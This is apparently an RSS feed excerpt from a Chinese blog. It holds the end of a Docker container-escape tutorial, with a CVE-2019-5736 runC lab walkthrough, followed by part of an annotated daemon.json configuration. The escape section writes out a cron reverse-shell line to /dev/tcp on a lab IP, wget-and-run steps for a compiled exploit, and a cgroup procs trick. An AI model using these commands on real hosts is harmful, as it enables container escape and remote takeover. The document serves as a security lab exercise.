<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>echo "echo '* * * * * bash -i &gt;&amp; /dev/tcp/192.168.198.128/8888 0&gt;&amp;1' &gt;&gt; /var/spool/cron/root"&gt;&gt; /cmd </span></span>
<span class="line"><span>chmod a+x /cmd </span></span>
<span class="line"><span>sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<h2><strong>runC逃逸-CVE-2019-5736</strong></h2>
<p>cve-2019-5736属于docker环境逃逸类型漏洞，该漏洞利用runC文件被覆盖，当管理员通过exec进入容器的时候，触发payload，从而达到逃逸  。个人理解这种方式利用的条件其实比较苛刻，主要苛刻在宿主机中必须有管理员使用exec进入当前docker环境，如果宿主机没有在运行EXP后进入该容器的话，是无法进行逃逸的。</p>
<h3><strong>影响版本</strong></h3>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3><strong>环境搭建</strong></h3>
<p>在部署该环境时，需要先将之前系统上所安装的docker卸载掉安装18.06版本的docker，我这里直接恢复了还没安装docker时的快照，故直接安装即可。</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh &amp;&amp; bash install.sh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>另外可以使用 Metarget去直接部署环境，操作命令如下：
安装Metarget</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>git clone https://github.com/brant-ruan/metarget.git</span></span>
<span class="line"><span>cd metarget/</span></span>
<span class="line"><span>pip3 install -r requirements.txt</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>部署cve-2019-5736</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>./metarget cnv install cve-2019-5736</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>如上，已成功搭建好符合版本的docker环境，接下来我们启动一个docker容器即可</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>docker run -it ubuntu:18.04</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<h3><strong>漏洞利用</strong></h3>
<p>下载EXP</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>修改payload为反弹shell</p>
<p></p>
<p>修改完之后进行编译，</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>编译后会生成一个main的可执行文件，这里我们需要将其放到docker容器中，在kali中启动一个http服务，在容器中使用wget的命令去下载该文件</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>python3 -m http.server 8080</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>在docker容器中下载该exp，并赋予执行权限，执行</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>wget http://192.168.198.128:8080/main</span></span>
<span class="line"><span>chmod u+x main</span></span>
<span class="line"><span>./main</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>然后这里我们假装为宿主机管理员，现在进入到该容器中</p>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>docker ps</span></span>
<span class="line"><span>docker exec -it 3056c91f69ea</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p></p>
<p>这时再来看我们的docker容器里执行的exp已然被执行</p>
<p></p>
<p>但是奇怪的是并没有反弹过来shell，其他命令也无法被执行，修改了n次paylaod也无果，希望有成功的大佬能告知小弟步骤哪里错了。
至此，Docker逃逸漏洞案例章节完结，撒花~~</p>
<p>参考链接：
<a href="https://link.zhihu.com/?target=https%3A//blog.csdn.net/qq_69775412/article/details/124265678" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/qq_69775412/article/details/124265678</a>
<a href="https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/1987725" target="_blank" rel="noopener noreferrer">https://cloud.tencent.com/developer/article/1987725</a>
<a href="https://link.zhihu.com/?target=https%3A//copyfuture.com/blogs-details/202206262308472625" target="_blank" rel="noopener noreferrer">https://copyfuture.com/blogs-details/202206262308472625</a>
<a href="https://link.zhihu.com/?target=https%3A//www.freebuf.com/vuls/264843.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/vuls/264843.html</a>
<a href="https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000040980305" target="_blank" rel="noopener noreferrer">https://segmentfault.com/a/1190000040980305</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker配置daemon.json文件</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E9%85%8D%E7%BD%AEdaemon.json%E6%96%87%E4%BB%B6.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E9%85%8D%E7%BD%AEdaemon.json%E6%96%87%E4%BB%B6.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker配置daemon.json文件</source>
      <description>Docker配置daemon.json文件 daemon.json 是docker daemon进程的配置文件，默认没有，配置时请新建。 创建或修改/etc/docker/daemon.json文件 下面是一些常用配置案例。 All Simple1 Simple2</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p><code>daemon.json</code> 是docker daemon进程的配置文件，默认没有，配置时请新建。
创建或修改/etc/docker/daemon.json文件
下面是一些常用配置案例。</p>
</blockquote>
<h2>All</h2>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-json"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 用一组新的注册表替换守护程序将向其推送不可分发工件的注册表集</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "allow-nondistributable-artifacts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "api-cors-header"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 指定要使用的授权插件</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "authorization-plugins"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "bip"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 标志设置docker0为默认桥接网络</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "bridge"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cgroup-parent"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-advertise"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 使用新地址重新加载发现存储。</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-store"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 使用新选项重新加载发现存储。</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-store-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {},</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "containerd"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/run/containerd/containerd.sock"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "containerd-namespace"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"docker"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "containerd-plugin-namespace"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"docker-plugins"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "data-root"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 当设置为 true 时，它将守护程序更改为调试模式</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "debug"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-address-pools"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "base"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"172.30.0.0/16"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">24</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "base"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"172.31.0.0/16"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">24</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-cgroupns-mode"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"private"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-gateway"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-gateway-v6"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-runtime"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"runc"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-shm-size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"64M"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "default-ulimits"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "nofile"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Hard"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">64000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"nofile"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">      "Soft"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">64000</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 设定容器DNS的地址，在容器的 /etc/resolv.conf 文件中可查看</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "dns"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "dns-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 设定容器的搜索域</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "dns-search"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "exec-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "exec-root"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "experimental"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 明确启用或禁用特定功能</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "features"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {},</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "fixed-cidr"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "fixed-cidr-v6"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "group"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "hosts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "icc"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "init"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "init-path"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/usr/libexec/docker-init"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "insecure-registries"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "ip"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"0.0.0.0"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "ip-forward"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "ip-masq"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 阻止 Docker 守护进程添加 iptables 规则</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "iptables"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "ip6tables"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "ipv6"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">false</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // docker主机的标签，很实用的功能,例如定义：–label nodeName=host-121</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "labels"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [],</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 启用在守护进程停机期间保持容器活动</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // Default driver for container logs (default "json-file")</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "log-driver"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"json-file"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "log-level"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">""</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  // 日志配置</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "log-opts"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "cache-disabled"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"false"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "cache-max-file"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"5"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "cache-max-size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"20m"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "cache-compress"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"true"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "env"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"os,customer"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "labels"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"somelabel"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "max-file"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"5"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "max-size"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"10m"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  },</span></span>
